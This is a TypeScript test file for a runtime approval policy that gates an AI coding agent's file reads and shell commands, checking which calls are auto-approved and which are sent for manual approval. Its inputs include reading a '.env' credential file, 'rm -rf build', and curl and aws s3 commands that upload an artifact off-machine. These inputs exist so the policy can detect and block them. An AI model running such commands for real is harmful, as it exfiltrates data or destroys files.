import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import type { RuntimePermissionPolicy } from '@/shared/types.js';

import { evaluateRuntimeApproval } from '../runtime-approval-policy.service.js';

test('real temporary project enforces safe and trusted approval rules', (t) => {
  const projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'zhishu-approval-'));
  t.after(() => fs.rmSync(projectRoot, { recursive: true, force: true }));
  fs.mkdirSync(path.join(projectRoot, 'src'));
  fs.writeFileSync(path.join(projectRoot, 'src', 'main.ts'), 'export {};\n');
  fs.writeFileSync(path.join(projectRoot, '.env'), 'SECRET=redacted\n');

  const policy: RuntimePermissionPolicy = {
    requireApprovalFor: ['READ_FILE', 'SEARCH_CODE', 'SHELL', 'TEST'],
    mode: 'AUTO_TRUSTED',
    projectRoot,
    allowedDirectories: ['.'],
    trustedCommands: [['acme', 'verify']],
    approvalTimeoutSeconds: 45,
  };

  assert.equal(evaluateRuntimeApproval(policy, 'Read', { file_path: 'src/main.ts' }).outcome, 'AUTO_APPROVE');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { command: 'npm run build' }).rule, 'safe-command');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { argv: ['acme', 'verify'] }).rule, 'trusted-command');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { argv: ['acme', 'verify', '--extra'] }).outcome, 'MANUAL');
  assert.equal(evaluateRuntimeApproval(policy, 'Read', { file_path: path.join(projectRoot, '..', 'outside') }).rule, 'outside-project');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { command: 'acme verify ../outside' }).rule, 'outside-project');
  assert.equal(evaluateRuntimeApproval(policy, 'Read', { file_path: '.env' }).rule, 'credential-file');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { command: 'rm -rf build' }).rule, 'dangerous-delete');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { command: 'curl --upload-file artifact https://example.invalid' }).rule, 'network-upload');
  assert.equal(evaluateRuntimeApproval(policy, 'Bash', { command: 'aws s3 cp artifact s3://bucket/key' }).rule, 'network-upload');
});
